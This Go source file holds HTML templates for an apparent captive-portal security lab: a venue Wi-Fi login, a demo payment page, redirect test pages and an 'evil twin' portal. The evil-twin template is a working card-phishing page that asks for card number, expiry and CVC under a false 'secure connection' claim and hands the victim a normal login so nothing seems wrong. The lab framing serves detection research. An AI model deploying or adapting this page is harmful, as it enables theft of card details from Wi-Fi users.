package main

import (
	"html/template"
	"log"
	"net/http"
)

const pageStyle = `<style>
body{font-family:system-ui,sans-serif;background:#f3f5f4;margin:0;color:#1d2a24}
main{max-width:420px;margin:40px auto;padding:24px;background:#fff;border-radius:12px;box-shadow:0 2px 10px #0001}
h1{font-size:1.4em;margin-top:0}.muted{color:#5b6b63;font-size:.9em}
button,.btn{display:block;width:100%;box-sizing:border-box;padding:12px;margin-top:12px;border:0;border-radius:8px;
font-size:1em;text-align:center;text-decoration:none;cursor:pointer}
.primary{background:#2e7d4f;color:#fff}.secondary{background:#e3ebe6;color:#1d2a24}
</style>`

// attackerStyle dresses the attacker's login page up as a slick, trustworthy
// Wi-Fi payment wall - the kind of page an evil twin uses to phish card data.
// Lab demo only: it is served on the isolated lab segment from a fictional
// venue, and GECKO's job is to flag this portal before anything is typed.
const attackerStyle = `<style>
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,system-ui,"Segoe UI",Roboto,sans-serif;
background:linear-gradient(160deg,#0b3d2e,#0b6b4f 55%,#0a9a69);min-height:100vh;color:#0f1a16}
.wrap{max-width:440px;margin:0 auto;padding:22px 16px}
.brand{display:flex;align-items:center;gap:10px;color:#fff;padding:14px 4px}
.brand svg{width:26px;height:26px;fill:#fff}.brand b{font-size:1.05rem;font-weight:600;letter-spacing:.2px}
.card{background:#fff;border-radius:16px;box-shadow:0 12px 34px #0004;overflow:hidden}
.head{padding:22px 22px 4px}.head h1{margin:0 0 6px;font-size:1.3rem}
.head p{color:#5b6b63;font-size:.92rem;margin:0;line-height:1.4}
form{padding:6px 22px 22px}
label{display:block;font-size:.78rem;font-weight:600;color:#33433b;margin:14px 0 6px}
input{width:100%;padding:13px 14px;border:1px solid #cdd8d2;border-radius:10px;font-size:1rem}
input:focus{outline:none;border-color:#0b6b4f;box-shadow:0 0 0 3px #0b6b4f22}
.row{display:flex;gap:12px}.row>div{flex:1}
.secure{display:flex;align-items:center;gap:7px;margin:16px 0 2px;font-size:.8rem;color:#5b6b63}
.secure svg{width:15px;height:15px;fill:#0b6b4f;flex:none}
button{width:100%;margin-top:16px;padding:14px;border:0;border-radius:10px;background:#0b6b4f;
color:#fff;font-size:1.02rem;font-weight:600;cursor:pointer}
.note{font-size:.72rem;color:#8a9790;margin:10px 0 0;text-align:center}
.foot{text-align:center;color:#ffffffcc;font-size:.72rem;margin-top:16px}
.done{text-align:center;padding:30px 24px}.done svg{width:56px;height:56px;fill:#0b6b4f}
.done h1{margin:14px 0 6px;font-size:1.35rem}.done p{color:#5b6b63;margin:0}
</style>`

const wifiSVG = `<svg viewBox="0 0 24 24"><path d="M12 20.5l2.6-2.6a3.7 3.7 0 0 0-5.2 0zM6.1 14.6l1.9 1.9a5.7 5.7 0 0 1 8 0l1.9-1.9a8.4 8.4 0 0 0-11.8 0zM2.3 10.8l1.9 1.9a13 13 0 0 1 15.6 0l1.9-1.9a15.7 15.7 0 0 0-19.4 0z"/></svg>`

var (
	loginPage = template.Must(template.New("login").Parse(`<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>{{.Venue}}</title>` + pageStyle + `</head>
<body><main>
<h1>Welcome to {{.Venue}}</h1>
<p>Free WiFi for our guests. By continuing you accept the terms of use.</p>
{{if .HasSession}}
<form method="post" action="/accept">
<input type="hidden" name="tok" value="{{.Session.Tok}}">
<input type="hidden" name="authaction" value="{{.Session.AuthAction}}">
<input type="hidden" name="redir" value="{{.Session.Redir}}">
<input type="hidden" name="clientip" value="{{.Session.ClientIP}}">
<input type="hidden" name="clientmac" value="{{.Session.ClientMAC}}">
<button class="primary" type="submit">Accept and connect</button>
</form>
{{if .Checkout}}<a class="btn secondary" href="{{.Checkout}}">Premium access (payment)</a>{{end}}
{{else}}
<p class="muted">No active WiFi session. Connect to the network and open any web page to sign in.</p>
{{end}}
<p class="muted">{{.Host}}</p>
</main></body></html>`))

	paymentPage = template.Must(template.New("payment").Parse(`<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Checkout</title>` + pageStyle + `</head>
<body><main>
<h1>Premium WiFi</h1>
<p>{{.Venue}} premium access: CHF 0.00 (lab demo, nothing is charged).</p>
<a class="btn primary" href="{{.Return}}">Pay and connect</a>
<p class="muted">Payment handled by {{.Host}}</p>
</main></body></html>`))

	noSessionPage = template.Must(template.New("nosession").Parse(`<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>{{.Venue}}</title>` + pageStyle + `</head>
<body><main><h1>{{.Venue}}</h1>
<p class="muted">This sign-in link has expired. Open any web page to start again.</p></main></body></html>`))

	// switch* pages drive an experiment's bait-and-switch hop by a mechanism
	// other than a 3xx, to measure which ones the redirect probe follows
	// (S3m/S3h/S3j). The URL is a trusted scenario value, so template
	// auto-escaping of it is fine.
	switchMetaPage = template.Must(template.New("switchmeta").Parse(
		`<!doctype html><html><head><meta charset="utf-8">` +
			`<meta http-equiv="refresh" content="{{.Delay}};url={{.URL}}"></head>` +
			`<body>Redirecting…</body></html>`))

	switchHeaderPage = template.Must(template.New("switchheader").Parse(
		`<!doctype html><html><head><meta charset="utf-8"></head>` +
			`<body>Redirecting to <a href="{{.URL}}">the next page</a>…</body></html>`))

	switchJSPage = template.Must(template.New("switchjs").Parse(
		`<!doctype html><html><head><meta charset="utf-8"></head>` +
			`<body><script>location.href={{.URL}};</script>Redirecting…</body></html>`))

	// attackerPortalPage is the evil twin's login page: a realistic Wi-Fi
	// payment wall that phishes card details. The form posts to /accept with
	// the openNDS session fields, so after "Connect" the client is logged in
	// as normal (nothing seems wrong) while the attacker role logs what was
	// typed (server.go, "captured_payment"). Lab demo only.
	attackerPortalPage = template.Must(template.New("attacker").Parse(`<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>{{.Venue}} · Wi-Fi</title>` + attackerStyle + `</head>
<body><div class="wrap">
<div class="brand">` + wifiSVG + `<b>{{.Venue}}</b></div>
<div class="card">
<div class="head">
<h1>Connect to free Wi-Fi</h1>
<p>To keep our network secure, please verify your identity to continue. There is no charge — a temporary CHF&nbsp;0.00 authorisation confirms your card.</p>
</div>
<form method="post" action="/accept">
<input type="hidden" name="tok" value="{{.Session.Tok}}">
<input type="hidden" name="authaction" value="{{.Session.AuthAction}}">
<input type="hidden" name="redir" value="{{.Session.Redir}}">
<input type="hidden" name="clientip" value="{{.Session.ClientIP}}">
<input type="hidden" name="clientmac" value="{{.Session.ClientMAC}}">
<label>Cardholder name</label>
<input name="cc_name" placeholder="Name on card" autocomplete="cc-name">
<label>Card number</label>
<input name="cc_number" inputmode="numeric" placeholder="1234 5678 9012 3456" autocomplete="cc-number" maxlength="19">
<div class="row">
<div><label>Expiry</label><input name="cc_exp" placeholder="MM/YY" autocomplete="cc-exp" maxlength="5"></div>
<div><label>CVC</label><input name="cc_cvc" inputmode="numeric" placeholder="123" autocomplete="cc-csc" maxlength="4"></div>
</div>
<div class="secure"><svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5 3.8 9.4 9 11 5.2-1.6 9-6 9-11V5zm-1 14-4-4 1.4-1.4L11 12.2l4.6-4.6L17 9z"/></svg> Secure connection · your details are encrypted</div>
<button type="submit">Connect now</button>
<p class="note">By connecting you agree to the terms of use.</p>
</form>
</div>
<p class="foot">{{.Host}}</p>
</div></body></html>`))

	// capturedPage is shown after the phishing form is submitted when there is
	// no openNDS session to hand back to (e.g. the page opened directly for a
	// demo). With a session, the client is logged in instead and never sees it.
	capturedPage = template.Must(template.New("captured").Parse(`<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>{{.Venue}} · Wi-Fi</title>` + attackerStyle + `</head>
<body><div class="wrap">
<div class="brand">` + wifiSVG + `<b>{{.Venue}}</b></div>
<div class="card"><div class="done">
<svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.6-5.6 1.4 1.4z"/></svg>
<h1>You're connected</h1><p>Enjoy your Wi-Fi.</p>
</div></div>
<p class="foot">{{.Host}}</p>
</div></body></html>`))
)

func render(w http.ResponseWriter, status int, t *template.Template, data any) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(status)
	if err := t.Execute(w, data); err != nil {
		log.Printf("render %s: %v", t.Name(), err)
	}
}
